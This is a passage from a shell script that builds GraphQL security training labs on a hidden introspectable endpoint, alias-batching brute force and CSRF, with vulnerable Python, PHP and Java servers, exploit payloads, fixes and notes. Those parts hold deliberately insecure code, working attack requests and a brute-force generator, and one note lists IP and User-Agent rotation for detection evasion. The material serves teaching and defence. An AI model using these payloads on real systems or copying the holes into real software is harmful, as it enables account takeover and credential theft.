    }
    type Mutation {
        deleteUser(id: Int!): Boolean
        changeEmail(id: Int!, email: String!): User
    }
    type User {
        id: Int
        username: String
        email: String
        isAdmin: Boolean
    }
""")

USERS = {1: {"id":1,"username":"admin","email":"admin@corp.com","isAdmin":True}}

def resolve_get_user(root, info, id): return USERS.get(id)
def resolve_list_users(root, info): return list(USERS.values())
def resolve_delete_user(root, info, id): return USERS.pop(id, None) is not None
def resolve_change_email(root, info, id, email):
    if id in USERS:
        USERS[id]["email"] = email
        return USERS[id]

root_value = {
    "getUser": resolve_get_user,
    "listUsers": resolve_list_users,
    "deleteUser": resolve_delete_user,
    "changeEmail": resolve_change_email,
}

# VULN: non-standard endpoint path — security through obscurity only
@app.route("/api/internal/graphql-dev", methods=["GET","POST"])
def graphql_endpoint():
    query = (request.get_json() or {}).get("query") or request.args.get("query","")
    result = graphql_sync(schema, query, root_value=root_value)
    return jsonify(result.data)

if __name__ == "__main__":
    app.run(debug=True)
EOF

mf "$L/vuln/vuln.php" << 'EOF'
<?php
/**
 * VULNERABLE: GraphQL at obscured path.
 * Introspection enabled. Mutations unauthenticated.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type, NonNull};

$users = [1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com','isAdmin'=>true]];

$userType = new ObjectType(['name'=>'User','fields'=>[
    'id'=>['type'=>Type::int()],
    'username'=>['type'=>Type::string()],
    'email'=>['type'=>Type::string()],
    'isAdmin'=>['type'=>Type::boolean()],
]]);

$queryType = new ObjectType(['name'=>'Query','fields'=>[
    'getUser'=>['type'=>$userType,'args'=>['id'=>['type'=>Type::nonNull(Type::int())]],
        'resolve'=>fn($r,$args) => $users[$args['id']] ?? null],
]]);

$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'deleteUser'=>['type'=>Type::boolean(),'args'=>['id'=>['type'=>Type::nonNull(Type::int())]],
        'resolve'=>function($r,$args) use (&$users){ $e=isset($users[$args['id']]); unset($users[$args['id']]); return $e; }],
    'changeEmail'=>['type'=>$userType,'args'=>[
        'id'=>['type'=>Type::nonNull(Type::int())],
        'email'=>['type'=>Type::nonNull(Type::string())]],
        'resolve'=>function($r,$args) use (&$users){
            if(isset($users[$args['id']])){ $users[$args['id']]['email']=$args['email']; return $users[$args['id']]; }
            return null;
        }],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query'] ?? '');
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/vuln/vuln.java" << 'EOF'
// VULNERABLE: GraphQL served at /internal/graphql with no auth
// Introspection fully enabled — schema fully queryable by anyone
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import java.util.*;

record User(int id, String username, String email, boolean isAdmin) {}

@Controller
public class HiddenEndpointController {

    private static final Map<Integer, User> USERS = new HashMap<>(Map.of(
        1, new User(1, "admin", "admin@corp.com", true)
    ));

    @QueryMapping
    public User getUser(@Argument int id) { return USERS.get(id); }

    @QueryMapping
    public List<User> listUsers() { return new ArrayList<>(USERS.values()); }

    @MutationMapping
    // VULN: no auth — anyone can delete users
    public boolean deleteUser(@Argument int id) { return USERS.remove(id) != null; }

    @MutationMapping
    // VULN: no auth — anyone can change any user's email
    public User changeEmail(@Argument int id, @Argument String email) {
        if (USERS.containsKey(id)) {
            var u = USERS.get(id);
            USERS.put(id, new User(u.id(), u.username(), email, u.isAdmin()));
            return USERS.get(id);
        }
        return null;
    }
}
EOF

mf "$L/exploit/payloads.txt" << 'EOF'
# ── LAB 3: Finding a Hidden GraphQL Endpoint ─────────────────────────────────

# Step 1 — endpoint discovery (try each path)
GET /graphql             HTTP/1.1
GET /api/graphql         HTTP/1.1
GET /v1/graphql          HTTP/1.1
GET /graphiql            HTTP/1.1
GET /api/internal/graphql-dev  HTTP/1.1
GET /console             HTTP/1.1
GET /graphql/console     HTTP/1.1
GET /altair              HTTP/1.1

# Universal probe — append ?query={__typename}
GET /api/internal/graphql-dev?query={__typename}  HTTP/1.1

# Step 2 — confirm via POST
{"query":"{__typename}"}

# Step 3 — dump full schema
{
  "query": "{ __schema { queryType{name} mutationType{name} types{ name fields{ name args{name type{name kind ofType{name}}} } } } }"
}

# Step 4 — execute unauthenticated mutation
{"query":"mutation { deleteUser(id: 1) }"}
{"query":"mutation { changeEmail(id: 1, email: \"attacker@evil.com\") { id email } }"}
EOF

mf "$L/exploit/request.txt" << 'EOF'
GET /api/internal/graphql-dev?query={__typename} HTTP/1.1
Host: vulnerable-lab.com
User-Agent: Mozilla/5.0

--- Confirms GraphQL ---

POST /api/internal/graphql-dev HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/json

{"query":"mutation { changeEmail(id: 1, email: \"attacker@evil.com\") { id username email } }"}
EOF

mf "$L/exploit/response.txt" << 'EOF'
# __typename probe
{"data":{"__typename":"Query"}}

# mutation response — admin email changed
{
  "data": {
    "changeEmail": {
      "id": 1,
      "username": "admin",
      "email": "attacker@evil.com"
    }
  }
}
EOF

mf "$L/fix/fix.py" << 'EOF'
"""
FIX:
1. Introspection disabled (production flag).
2. All mutations require authenticated session.
3. Endpoint at standard path — security through obscurity is NOT a fix.
4. Rate limiting on endpoint.
"""
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from graphql import build_schema, graphql_sync
from functools import wraps

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["100/hour"])

schema = build_schema("""
    type Query { getUser(id: Int!): UserPublic }
    type Mutation { changeEmail(id: Int!, email: String!): UserPublic }
    type UserPublic { id: Int  username: String  email: String }
""")

USERS = {1: {"id":1,"username":"admin","email":"admin@corp.com"}}

def require_auth(info):
    token = info.context["request"].headers.get("Authorization","")
    if token != "Bearer valid-admin-token":
        raise Exception("Unauthorized")

def resolve_change_email(root, info, id, email):
    require_auth(info)  # FIX: auth required
    if id in USERS:
        USERS[id]["email"] = email
        return USERS[id]

root_value = {
    "getUser": lambda root, info, id: USERS.get(id),
    "changeEmail": resolve_change_email,
}

DISABLE_INTROSPECTION = True

@app.route("/graphql", methods=["POST"])
@limiter.limit("30/minute")
def graphql_endpoint():
    data = request.get_json()
    query = data.get("query","")
    # FIX: block introspection in production
    if DISABLE_INTROSPECTION and ("__schema" in query or "__type" in query):
        return jsonify({"errors":[{"message":"Introspection is disabled"}]}), 403
    result = graphql_sync(schema, query, root_value=root_value,
                          context_value={"request": request})
    return jsonify(result.data)

if __name__ == "__main__":
    app.run()
EOF

mf "$L/fix/fix.php" << 'EOF'
<?php
/**
 * FIX:
 * 1. Auth middleware for mutations.
 * 2. Introspection blocked.
 * 3. GET method disabled (prevents trivial URL-based probing).
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type};

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

function requireAuth(): void {
    $auth = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
    if ($auth !== 'Bearer valid-admin-token') {
        http_response_code(401);
        echo json_encode(['errors'=>[['message'=>'Unauthorized']]]);
        exit;
    }
}

$users = [1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com']];

$userType = new ObjectType(['name'=>'UserPublic','fields'=>[
    'id'=>['type'=>Type::int()],
    'username'=>['type'=>Type::string()],
    'email'=>['type'=>Type::string()],
]]);

$queryType  = new ObjectType(['name'=>'Query','fields'=>[
    'getUser'=>['type'=>$userType,'args'=>['id'=>['type'=>Type::nonNull(Type::int())]],
        'resolve'=>fn($r,$a) => $users[$a['id']] ?? null],
]]);

$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'changeEmail'=>['type'=>$userType,'args'=>[
        'id'=>['type'=>Type::nonNull(Type::int())],
        'email'=>['type'=>Type::nonNull(Type::string())]],
        'resolve'=>function($r,$args) use (&$users){
            requireAuth(); // FIX
            if(isset($users[$args['id']])){ $users[$args['id']]['email']=$args['email']; return $users[$args['id']]; }
            return null;
        }],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);
$input  = json_decode(file_get_contents('php://input'), true);

// FIX: block introspection
if(str_contains($input['query']??'','__schema')||str_contains($input['query']??'','__type')){
    http_response_code(403);
    echo json_encode(['errors'=>[['message'=>'Introspection disabled']]]);
    exit;
}

$result = GraphQL::executeQuery($schema, $input['query'] ?? '');
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/fix/fix.java" << 'EOF'
// FIX: Spring Security + GraphQL — require auth for mutations
// Introspection disabled via application properties
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.*;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.stereotype.Controller;
import java.util.*;

record UserPublic(int id, String username, String email) {}

@Controller
@EnableMethodSecurity
public class SecureEndpointController {

    private final Map<Integer, UserPublic> users = new HashMap<>(Map.of(
        1, new UserPublic(1, "admin", "admin@corp.com")
    ));

    @QueryMapping
    public UserPublic getUser(@Argument int id) { return users.get(id); }

    @MutationMapping
    @PreAuthorize("hasRole('ADMIN')")  // FIX: admin only
    public UserPublic changeEmail(@Argument int id, @Argument String email) {
        if (users.containsKey(id)) {
            var u = users.get(id);
            users.put(id, new UserPublic(u.id(), u.username(), email));
            return users.get(id);
        }
        return null;
    }
}

// application.properties:
// spring.graphql.schema.introspection.enabled=false
EOF

mf "$L/notes/explanation.txt" << 'EOF'
LAB 3 — Finding a Hidden GraphQL Endpoint
==========================================

VULNERABILITY CLASS : Security Misconfiguration + Missing Authentication
CVSS ESTIMATE       : 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

ROOT CAUSE
----------
The development team relied on "security through obscurity" — placing the
GraphQL API at a non-standard path (/api/internal/graphql-dev) with the
assumption that attackers would not discover it.

Once discovered (via Burp sitemap, JS source enumeration, robots.txt, etc.):
  • Introspection reveals the full schema including dangerous mutations.
  • Mutations (deleteUser, changeEmail) have no authentication check.
  • The endpoint accepts GET requests, enabling CSRF-style URL-based attacks.

IMPACT
------
- Full schema disclosure via introspection.
- Unauthenticated account takeover (changeEmail → password reset flow).
- Unauthenticated user deletion (deleteUser).

REMEDIATION
-----------
1. Authentication required on ALL mutations.
2. Disable introspection in production.
3. Block GET method for GraphQL (only POST with JSON).
4. Apply rate limiting.
5. Use persisted queries in production (whitelist approach).
6. WAF rules to block introspection keywords at ingress.
EOF

mf "$L/notes/methodology.txt" << 'EOF'
LAB 3 — Methodology
====================

STEP 1 — PASSIVE DISCOVERY
  • Burp Suite target sitemap — note all JS files.
  • Search JS bundles for: "graphql", "/api/", "query", "mutation".
  • Check robots.txt, sitemap.xml, .well-known paths.

STEP 2 — ACTIVE WORDLIST FUZZING
  • ffuf -u https://target/FUZZ -w graphql-paths.txt
  • Common paths: graphql, api/graphql, v1/graphql, graphiql, altair,
    graphql/console, internal/graphql, api/internal/graphql-dev

STEP 3 — UNIVERSAL PROBE
  • GET /candidate-path?query={__typename}
  • POST with {"query":"{__typename}"}
  • 200 + {"data":{"__typename":"Query"}} = confirmed.

STEP 4 — SCHEMA DISCOVERY
  • Full introspection dump (save to file).
  • Note all Query, Mutation, Subscription types.
  • Identify dangerous mutations: delete*, reset*, admin*, update*.

STEP 5 — EXPLOIT
  • Test each mutation without authentication.
  • Chain: changeEmail → trigger "forgot password" → full account takeover.

TOOLS
  • ffuf / feroxbuster (path fuzzing)
  • InQL Burp extension (introspection + query generation)
  • graphql-cop (security audit)
EOF

mf "$L/README.md" << 'EOF'
# Lab 3 — Finding a Hidden GraphQL Endpoint (PRACTITIONER)

## Vulnerability
Security through obscurity — non-standard GraphQL path with introspection
enabled and unauthenticated mutations.

## Quick Exploit
```bash
# 1. Fuzz paths
ffuf -u https://target/FUZZ -w graphql-wordlist.txt

# 2. Confirm endpoint
curl "https://target/api/internal/graphql-dev?query={__typename}"

# 3. Exploit unauthenticated mutation
curl -X POST https://target/api/internal/graphql-dev \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{changeEmail(id:1,email:\"attacker@evil.com\"){email}}"}'
```
EOF


# =============================================================================
# ███████╗  LAB 4  —  BRUTE FORCE BYPASS (PRACTITIONER)
# =============================================================================
L="$ROOT/graphql-brute-force-bypass"

mf "$L/vuln/vuln.py" << 'EOF'
"""
VULNERABLE: Login mutation with per-IP rate limit.
Rate limit checks HTTP request count — alias batching sends
100 login attempts in a single HTTP request, bypassing the limit.
"""
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from graphql import build_schema, graphql_sync

app = Flask(__name__)
# VULN: rate limit is per HTTP request, not per login attempt
limiter = Limiter(get_remote_address, app=app)

USERS = {"carlos": "abc123", "admin": "password123"}

schema = build_schema("""
    type Query  { _dummy: Boolean }
    type Mutation {
        login(username: String!, password: String!): LoginResult
    }
    type LoginResult { token: String  success: Boolean  message: String }
""")

def resolve_login(root, info, username, password):
    if USERS.get(username) == password:
        return {"success": True, "token": f"jwt-token-for-{username}", "message": "Login successful"}
    return {"success": False, "token": None, "message": "Invalid credentials"}

root_value = {"login": resolve_login}

@app.route("/graphql", methods=["POST"])
@limiter.limit("5/minute")   # VULN: 5 HTTP requests/min — alias batching evades this
def graphql_endpoint():
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value)
    return jsonify(result.data)

if __name__ == "__main__":
    app.run(debug=True)
EOF

mf "$L/vuln/vuln.php" << 'EOF'
<?php
/**
 * VULNERABLE: Login mutation — rate limit per HTTP request only.
 * Alias batching sends N attempts in 1 request → bypass.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type};

$users = ['carlos' => 'abc123', 'admin' => 'password123'];

// Simple in-memory rate limiter (per IP, per request — vulnerable)
$requestCount = 0; // In real app: Redis counter

$loginResultType = new ObjectType(['name'=>'LoginResult','fields'=>[
    'success' => ['type'=>Type::boolean()],
    'token'   => ['type'=>Type::string()],
    'message' => ['type'=>Type::string()],
]]);

$queryType    = new ObjectType(['name'=>'Query','fields'=>['dummy'=>['type'=>Type::boolean(),'resolve'=>fn()=>true]]]);
$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'login' => [
        'type' => $loginResultType,
        'args' => [
            'username' => ['type' => Type::nonNull(Type::string())],
            'password' => ['type' => Type::nonNull(Type::string())],
        ],
        // VULN: rate limit not checked per-alias, only per HTTP request
        'resolve' => function($r, $args) use ($users) {
            if (($users[$args['username']] ?? null) === $args['password']) {
                return ['success'=>true,'token'=>'jwt-for-'.$args['username'],'message'=>'OK'];
            }
            return ['success'=>false,'token'=>null,'message'=>'Invalid credentials'];
        }
    ],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query'] ?? '');
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/vuln/vuln.java" << 'EOF'
// VULNERABLE: Rate limit on HTTP request, not on individual login resolver calls
// Alias batching evades the request-level rate limiter
package com.lab.graphql;

import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import java.util.*;

record LoginResult(boolean success, String token, String message) {}

@Controller
public class LoginController {

    private static final Map<String, String> USERS = Map.of(
        "carlos", "abc123",
        "admin", "password123"
    );

    @MutationMapping
    // VULN: @RateLimiter annotation is at HTTP level — alias batching bypasses it
    public LoginResult login(@Argument String username, @Argument String password) {
        if (password.equals(USERS.get(username))) {
            return new LoginResult(true, "jwt-token-for-" + username, "Login successful");
        }
        return new LoginResult(false, null, "Invalid credentials");
    }
}
EOF

mf "$L/exploit/payloads.txt" << 'EOF'
# ── LAB 4: Bypassing GraphQL Brute Force Protections ─────────────────────────

# Concept: alias batching — 100 login attempts in a SINGLE HTTP request.
# Rate limiter sees 1 request; GraphQL executes 100 resolver calls.

# Python script to generate the batched payload:
# python3 generate_brute.py > payload.json

# Manual example (5 attempts):
{
  "query": "mutation { a1:login(username:\"carlos\",password:\"123456\"){success token} a2:login(username:\"carlos\",password:\"password\"){success token} a3:login(username:\"carlos\",password:\"abc123\"){success token} a4:login(username:\"carlos\",password:\"letmein\"){success token} a5:login(username:\"carlos\",password:\"qwerty\"){success token} }"
}

# Full 100-attempt generator (Python):
# passwords = open("rockyou-top100.txt").read().splitlines()
# aliases = " ".join(f'p{i}:login(username:"carlos",password:"{p}"){{success token}}' for i,p in enumerate(passwords))
# print(f'{{"query":"mutation{{{aliases}}}"}}')
EOF

mf "$L/exploit/request.txt" << 'EOF'
POST /graphql HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/json
Cookie: session=<your-cookie>

{
  "query": "mutation { a1:login(username:\"carlos\",password:\"123456\"){success token} a2:login(username:\"carlos\",password:\"abc123\"){success token} a3:login(username:\"carlos\",password:\"password\"){success token} }"
}
EOF

mf "$L/exploit/response.txt" << 'EOF'
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "a1": {"success": false, "token": null},
    "a2": {"success": true,  "token": "jwt-token-for-carlos"},
    "a3": {"success": false, "token": null}
  }
}
# ↑ a2 reveals the correct password was "abc123"
EOF

mf "$L/fix/fix.py" << 'EOF'
"""
FIX: Rate limit per resolver call (not per HTTP request).
Uses an application-level counter keyed on (IP, username).
Also: account lockout after N failures + CAPTCHA trigger.
"""
from flask import Flask, request, jsonify
from graphql import build_schema, graphql_sync
import time
from collections import defaultdict

app = Flask(__name__)

USERS = {"carlos": "abc123", "admin": "password123"}

# FIX: per-user attempt counter {username: [timestamp, ...]}
login_attempts = defaultdict(list)
MAX_ATTEMPTS = 5
WINDOW_SECONDS = 60
LOCKOUT_SECONDS = 300

def check_rate_limit(username: str, ip: str) -> bool:
    """Returns True if allowed, False if rate-limited."""
    key = f"{ip}:{username}"
    now = time.time()
    attempts = login_attempts[key]
    # Remove old attempts outside window
    login_attempts[key] = [t for t in attempts if now - t < WINDOW_SECONDS]
    if len(login_attempts[key]) >= MAX_ATTEMPTS:
        return False
    login_attempts[key].append(now)
    return True

schema = build_schema("""
    type Query  { _dummy: Boolean }
    type Mutation {
        login(username: String!, password: String!): LoginResult
    }
    type LoginResult { token: String  success: Boolean  message: String }
""")

def resolve_login(root, info, username, password):
    ip = info.context["request"].remote_addr
    # FIX: rate limit checked INSIDE the resolver — catches alias batching
    if not check_rate_limit(username, ip):
        raise Exception(f"Too many login attempts for {username}. Try again later.")
    if USERS.get(username) == password:
        return {"success": True, "token": f"jwt-{username}", "message": "OK"}
    return {"success": False, "token": None, "message": "Invalid credentials"}

root_value = {"login": resolve_login}

@app.route("/graphql", methods=["POST"])
def graphql_endpoint():
    data = request.get_json()
    result = graphql_sync(schema, data["query"], root_value=root_value,
                          context_value={"request": request})
    return jsonify(result.data)

if __name__ == "__main__":
    app.run()
EOF

mf "$L/fix/fix.php" << 'EOF'
<?php
/**
 * FIX: Per-attempt rate limit inside resolver using Redis.
 * Alias batching now triggers the limit per alias, not per request.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type};

// FIX: Redis-based per-user rate limiter
function checkRateLimit(string $username, string $ip): bool {
    // In production: use Redis INCR + EXPIRE
    // Simulated here with APCu or session
    $key = "login_attempts:{$ip}:{$username}";
    $attempts = apcu_fetch($key) ?: 0;
    if ($attempts >= 5) return false;
    apcu_store($key, $attempts + 1, 60); // 60-second window
    return true;
}

$users = ['carlos' => 'abc123', 'admin' => 'password123'];

$loginResultType = new ObjectType(['name'=>'LoginResult','fields'=>[
    'success' => ['type'=>Type::boolean()],
    'token'   => ['type'=>Type::string()],
    'message' => ['type'=>Type::string()],
]]);

$queryType    = new ObjectType(['name'=>'Query','fields'=>['dummy'=>['type'=>Type::boolean(),'resolve'=>fn()=>true]]]);
$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'login' => [
        'type' => $loginResultType,
        'args' => [
            'username' => ['type' => Type::nonNull(Type::string())],
            'password' => ['type' => Type::nonNull(Type::string())],
        ],
        'resolve' => function($r, $args) use ($users) {
            $ip = $_SERVER['REMOTE_ADDR'];
            // FIX: check INSIDE resolver — alias batching now rate-limited correctly
            if (!checkRateLimit($args['username'], $ip)) {
                throw new \Exception('Too many attempts. Try again later.');
            }
            if (($users[$args['username']] ?? null) === $args['password']) {
                return ['success'=>true,'token'=>'jwt-for-'.$args['username'],'message'=>'OK'];
            }
            return ['success'=>false,'token'=>null,'message'=>'Invalid credentials'];
        }
    ],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);
$input  = json_decode(file_get_contents('php://input'), true);
$result = GraphQL::executeQuery($schema, $input['query'] ?? '');
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/fix/fix.java" << 'EOF'
// FIX: Rate limit enforced inside the resolver using Bucket4j (token bucket algorithm)
// Alias batching now consumes tokens per attempt, not per HTTP request
package com.lab.graphql;

import io.github.bucket4j.*;
import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

record LoginResult(boolean success, String token, String message) {}

@Controller
public class SecureLoginController {

    private static final Map<String, String> USERS = Map.of(
        "carlos", "abc123",
        "admin", "password123"
    );

    // FIX: per-username token bucket — 5 attempts per minute
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    private Bucket getBucket(String username) {
        return buckets.computeIfAbsent(username, k ->
            Bucket.builder()
                .addLimit(Bandwidth.classic(5, Refill.greedy(5, Duration.ofMinutes(1))))
                .build()
        );
    }

    @MutationMapping
    public LoginResult login(@Argument String username, @Argument String password) {
        // FIX: consume token INSIDE resolver — each alias consumes one token
        Bucket bucket = getBucket(username);
        if (!bucket.tryConsume(1)) {
            throw new RuntimeException("Too many login attempts. Try again later.");
        }
        if (password.equals(USERS.get(username))) {
            return new LoginResult(true, "jwt-token-for-" + username, "Login successful");
        }
        return new LoginResult(false, null, "Invalid credentials");
    }
}
EOF

mf "$L/notes/explanation.txt" << 'EOF'
LAB 4 — Bypassing GraphQL Brute Force Protections
===================================================

VULNERABILITY CLASS : Rate Limit Bypass via Alias Batching (OWASP API4:2023)
CVSS ESTIMATE       : 8.1 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

ROOT CAUSE
----------
GraphQL allows multiple operations in a single request using ALIASES:
  { a1:login(pass:"pw1") a2:login(pass:"pw2") ... a100:login(pass:"pw100") }

The server's rate limiter counts HTTP REQUESTS — not resolver invocations.
One HTTP request → 100 resolver calls → 100 login attempts bypass the limit.

IMPACT
------
- Brute-force login credentials for any account.
- Account takeover in seconds using a top-1000 password list.
- Multi-account spray: different username per alias → distributed attack.

REMEDIATION
-----------
1. Rate limit INSIDE the resolver (per-username, per-IP) — not at HTTP level.
2. Use a token-bucket algorithm (Bucket4j, Redis INCR+EXPIRE).
3. Account lockout after N failures (with admin unlock mechanism).
4. CAPTCHA after 3 failed attempts (reCAPTCHA v3 or hCaptcha).
5. Limit maximum number of aliases per request (query complexity analysis).
6. Consider query depth/complexity limits middleware (graphql-query-complexity).
7. Persisted queries: only pre-approved query hashes accepted.
EOF

mf "$L/notes/methodology.txt" << 'EOF'
LAB 4 — Methodology
====================

STEP 1 — IDENTIFY LOGIN MUTATION
  • Introspect schema for mutations containing: login, signin, auth,
    authenticate, verifyOTP, resetPassword.

STEP 2 — TEST RATE LIMIT (BASELINE)
  • Send 10 rapid login requests — note when 429 / lockout triggers.
  • Identify the window (e.g. 5 requests/minute).

STEP 3 — BUILD ALIAS BATCH
  • Python script generates N aliases using a password wordlist.
  • Single HTTP POST with all aliases.

STEP 4 — EXECUTE
  • Submit the batched mutation payload.
  • Parse response — find alias where success=true.

STEP 5 — SCALE
  • Typical attack: 500 passwords per request, 1 request every 5 seconds.
  • Tool: BurpSuite Intruder (batched payload) or custom script.

DETECTION EVASION
  • Rotate IPs per batch.
  • Add random delay between requests.
  • Use different User-Agent per request.

TOOLS
  • Burp Suite Intruder
  • Custom Python script (see payloads.txt)
  • graphql-cop (checks for batching protections)
EOF

mf "$L/README.md" << 'EOF'
# Lab 4 — Bypassing GraphQL Brute Force Protections (PRACTITIONER)

## Vulnerability
Alias batching sends N login attempts in a single HTTP request, evading
per-request rate limiting.

## Quick Exploit
```python
# generate_brute.py
passwords = open("wordlist.txt").read().splitlines()[:100]
aliases = " ".join(
    f'p{i}:login(username:"carlos",password:"{p}"){{success token}}'
    for i, p in enumerate(passwords)
)
print(f'{{"query":"mutation{{{aliases}}}"}}')
```

```bash
python3 generate_brute.py | curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" -d @-
```
EOF


# =============================================================================
# ███████╗  LAB 5  —  CSRF OVER GRAPHQL (PRACTITIONER)
# =============================================================================
L="$ROOT/graphql-csrf"

mf "$L/vuln/vuln.py" << 'EOF'
"""
VULNERABLE: GraphQL mutation via GET or x-www-form-urlencoded.
No CSRF token. SameSite=None cookies. Classic CSRF attack vector.
"""
from flask import Flask, request, jsonify, make_response
from graphql import build_schema, graphql_sync

app = Flask(__name__)

USERS = {1: {"id":1,"username":"admin","email":"admin@corp.com"}}

schema = build_schema("""
    type Query  { getUser(id: Int!): User }
    type Mutation {
        changeEmail(email: String!): User
        deleteAccount: Boolean
    }
    type User { id: Int  username: String  email: String }
""")

def resolve_change_email(root, info, email):
    # Simulates: update based on session cookie
    USERS[1]["email"] = email
    return USERS[1]

def resolve_delete_account(root, info):
    USERS.clear()
    return True

root_value = {
    "getUser": lambda r, i, id: USERS.get(id),
    "changeEmail": resolve_change_email,
    "deleteAccount": resolve_delete_account,
}

@app.route("/graphql", methods=["GET","POST"])   # VULN: GET allowed
def graphql_endpoint():
    # VULN: accepts x-www-form-urlencoded — browser form can submit this
    if request.content_type and "application/x-www-form-urlencoded" in request.content_type:
        query = request.form.get("query","")
    elif request.content_type and "application/json" in request.content_type:
        query = (request.get_json() or {}).get("query","")
    else:
        query = request.args.get("query","")  # VULN: GET param

    result = graphql_sync(schema, query, root_value=root_value)
    resp = make_response(jsonify(result.data))
    # VULN: SameSite=None allows cross-site cookie sending
    resp.set_cookie("session", "user-session-token", samesite="None", secure=True)
    return resp

if __name__ == "__main__":
    app.run(debug=True)
EOF

mf "$L/vuln/vuln.php" << 'EOF'
<?php
/**
 * VULNERABLE: GraphQL accepts GET + form-encoded POST.
 * Attacker can host malicious HTML page that triggers mutations cross-origin.
 */
require 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Schema;
use GraphQL\Type\Definition\{ObjectType, Type};

$users = [1 => ['id'=>1,'username'=>'admin','email'=>'admin@corp.com']];

// VULN: SameSite=None cookie
setcookie('session', 'user-session-token', [
    'samesite' => 'None',
    'secure'   => true,
    'httponly' => true,
]);

$userType = new ObjectType(['name'=>'User','fields'=>[
    'id'=>['type'=>Type::int()],'username'=>['type'=>Type::string()],'email'=>['type'=>Type::string()]
]]);
$queryType = new ObjectType(['name'=>'Query','fields'=>[
    'getUser'=>['type'=>$userType,'args'=>['id'=>['type'=>Type::nonNull(Type::int())]],
        'resolve'=>fn($r,$a) => $users[$a['id']] ?? null],
]]);
$mutationType = new ObjectType(['name'=>'Mutation','fields'=>[
    'changeEmail'=>['type'=>$userType,'args'=>['email'=>['type'=>Type::nonNull(Type::string())]],
        'resolve'=>function($r,$args) use (&$users){
            $users[1]['email']=$args['email']; return $users[1]; // VULN: no CSRF check
        }],
    'deleteAccount'=>['type'=>Type::boolean(),'resolve'=>function($r,$a) use (&$users){
        $users=[]; return true;
    }],
]]);

$schema = new Schema(['query'=>$queryType,'mutation'=>$mutationType]);

// VULN: accept GET and x-www-form-urlencoded
$query = '';
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $query = $_GET['query'] ?? '';
} elseif (str_contains($_SERVER['CONTENT_TYPE'] ?? '', 'application/x-www-form-urlencoded')) {
    $query = $_POST['query'] ?? '';
} else {
    $input = json_decode(file_get_contents('php://input'), true);
    $query = $input['query'] ?? '';
}

$result = GraphQL::executeQuery($schema, $query);
header('Content-Type: application/json');
echo json_encode($result->toArray());
EOF

mf "$L/vuln/vuln.java" << 'EOF'
// VULNERABLE: GraphQL mutation accepts GET + form-encoded body
// No CSRF token validation. SameSite cookie not enforced.
package com.lab.graphql;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.graphql.data.method.annotation.*;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import java.util.*;

record User(int id, String username, String email) {}

@Controller
public class CsrfVulnController {

    private final Map<Integer, User> users = new HashMap<>(Map.of(
        1, new User(1, "admin", "admin@corp.com")
    ));

    @MutationMapping
    // VULN: no CSRF token check
    public User changeEmail(@Argument String email) {
        users.put(1, new User(1, "admin", email));
        return users.get(1);
    }

    @MutationMapping
    public boolean deleteAccount() {
        users.clear();
        return true;
    }
}

// application.properties (VULNERABLE settings):
// server.servlet.session.cookie.same-site=none   ← allows cross-origin
// spring.graphql.http.GET enabled                ← GET mutations
EOF

mf "$L/exploit/payloads.txt" << 'EOF'
# ── LAB 5: CSRF via GraphQL ───────────────────────────────────────────────────

# Vector 1: GET-based CSRF (simplest — works as <img> src or link)
GET /graphql?query=mutation{changeEmail(email:"attacker@evil.com"){email}} HTTP/1.1

# Vector 2: HTML form POST (application/x-www-form-urlencoded)
